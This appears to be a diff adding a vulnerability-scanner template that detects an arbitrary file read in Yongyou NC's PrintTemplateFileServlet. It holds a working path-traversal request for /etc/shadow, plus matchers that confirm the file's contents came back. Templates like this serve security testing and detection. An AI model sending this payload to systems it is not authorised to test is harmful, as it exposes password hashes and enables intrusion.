@@ -1,0 +1,29 @@
+id: yongyou-nc-printtemplatefileservlet-anyfile-read
+info:
+  name: Yongyou NC PrintTemplateFileServlet Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/~uapweb/nc.lfw.billtemplate.servlet.PrintTemplateFileServlet?filePath=../../../etc/shadow"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "bin"
+      - type: word
+        part: header
+        words:
+          - "application/pdf"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
